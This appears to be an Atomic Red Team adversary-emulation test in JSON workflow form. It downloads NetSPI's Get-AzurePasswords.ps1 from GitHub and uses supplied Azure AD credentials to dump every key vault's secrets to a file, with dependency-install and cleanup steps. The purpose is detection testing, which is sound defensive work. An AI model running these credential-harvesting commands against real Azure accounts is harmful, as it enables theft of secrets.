{
  "id": "1b83cddb-eaa7-45aa-98a5-85fb0a8807ea",
  "name": "Azure - Dump All Azure Key Vaults with Microburst",
  "description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/",
  "platforms": [
    "iaas:azure"
  ],
  "steps": [
    {
      "id": "49ff157d-30a5-47b8-a3e1-824205561290",
      "type": "execute-command",
      "data": {
        "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzureRmAccount -Credential $Credential\nGet-AzurePasswords -subscription '#{subscription_id}' \u003e #{output_file}\ncat #{output_file}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "dfd6a764-4aa9-4d68-a568-1017657bfc15",
      "type": "execute-command",
      "data": {
        "command": "remove-item #{output_file} -force -erroraction silentlycontinue\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "9d7736f6-ec8f-4166-9696-922e030d810c",
      "name": "Check dependency 1/3",
      "description": "The Get-AzurePasswords script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9aee4796-6c83-4f08-a7ae-ab4ccfeb02fa",
      "name": "Resolve dependency 1/3",
      "description": "The Get-AzurePasswords script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "4d9ad2a2-126e-4dc8-9fe6-c885c2fedadc",
      "name": "Re-check dependency 1/3",
      "description": "The Get-AzurePasswords script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"){exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5b1fe93a-ee02-426d-8e89-8a55575c321b",
      "name": "Check dependency 2/3",
      "description": "The Azure RM module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "4866ba23-debe-455b-a1be-e23f4cd296bd",
      "name": "Resolve dependency 2/3",
      "description": "The Azure RM module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name AzureRM -Force -allowclobber\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "436f83af-50ec-46ab-a21a-19c30abe64d4",
      "name": "Re-check dependency 2/3",
      "description": "The Azure RM module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "bd0fda0b-d7c3-4dc7-b1e8-db5df951447b",
      "name": "Check dependency 3/3",
      "description": "The Azure module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "2473ffc9-a38d-4526-90a9-e036c0bdb3e1",
      "name": "Resolve dependency 3/3",
      "description": "The Azure module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name Azure -Force -allowclobber\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "e1920d06-8bfa-435e-9e67-51f09cc86e09",
      "name": "Re-check dependency 3/3",
      "description": "The Azure module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "49ff157d-30a5-47b8-a3e1-824205561290",
      "p": "on-success",
      "o": "dfd6a764-4aa9-4d68-a568-1017657bfc15"
    },
    {
      "s": "49ff157d-30a5-47b8-a3e1-824205561290",
      "p": "on-failure",
      "o": "dfd6a764-4aa9-4d68-a568-1017657bfc15"
    },
    {
      "s": "9d7736f6-ec8f-4166-9696-922e030d810c",
      "p": "on-success",
      "o": "49ff157d-30a5-47b8-a3e1-824205561290"
    },
    {
      "s": "9d7736f6-ec8f-4166-9696-922e030d810c",
      "p": "on-failure",
      "o": "9aee4796-6c83-4f08-a7ae-ab4ccfeb02fa"
    },
    {
      "s": "9aee4796-6c83-4f08-a7ae-ab4ccfeb02fa",
      "p": "on-success",
      "o": "4d9ad2a2-126e-4dc8-9fe6-c885c2fedadc"
    },
    {
      "s": "4d9ad2a2-126e-4dc8-9fe6-c885c2fedadc",
      "p": "on-failure",
      "o": "49ff157d-30a5-47b8-a3e1-824205561290"
    },
    {
      "s": "5b1fe93a-ee02-426d-8e89-8a55575c321b",
      "p": "on-success",
      "o": "49ff157d-30a5-47b8-a3e1-824205561290"
    },
    {
      "s": "5b1fe93a-ee02-426d-8e89-8a55575c321b",
      "p": "on-failure",
      "o": "4866ba23-debe-455b-a1be-e23f4cd296bd"
    },
    {
      "s": "4866ba23-debe-455b-a1be-e23f4cd296bd",
      "p": "on-success",
      "o": "436f83af-50ec-46ab-a21a-19c30abe64d4"
    },
    {
      "s": "436f83af-50ec-46ab-a21a-19c30abe64d4",
      "p": "on-failure",
      "o": "49ff157d-30a5-47b8-a3e1-824205561290"
    },
    {
      "s": "bd0fda0b-d7c3-4dc7-b1e8-db5df951447b",
      "p": "on-success",
      "o": "49ff157d-30a5-47b8-a3e1-824205561290"
    },
    {
      "s": "bd0fda0b-d7c3-4dc7-b1e8-db5df951447b",
      "p": "on-failure",
      "o": "2473ffc9-a38d-4526-90a9-e036c0bdb3e1"
    },
    {
      "s": "2473ffc9-a38d-4526-90a9-e036c0bdb3e1",
      "p": "on-success",
      "o": "e1920d06-8bfa-435e-9e67-51f09cc86e09"
    },
    {
      "s": "e1920d06-8bfa-435e-9e67-51f09cc86e09",
      "p": "on-failure",
      "o": "49ff157d-30a5-47b8-a3e1-824205561290"
    }
  ],
  "tags": [
    "T1528",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "password",
      "type": "string",
      "description": "Azure AD password",
      "value": "T1082Az"
    },
    {
      "name": "output_file",
      "type": "string",
      "description": "File to dump results to",
      "value": "$env:temp\\T1528Test1.txt"
    },
    {
      "name": "subscription_id",
      "type": "string",
      "description": "Azure subscription id to search",
      "value": ""
    },
    {
      "name": "username",
      "type": "string",
      "description": "Azure AD username",
      "value": ""
    }
  ]
}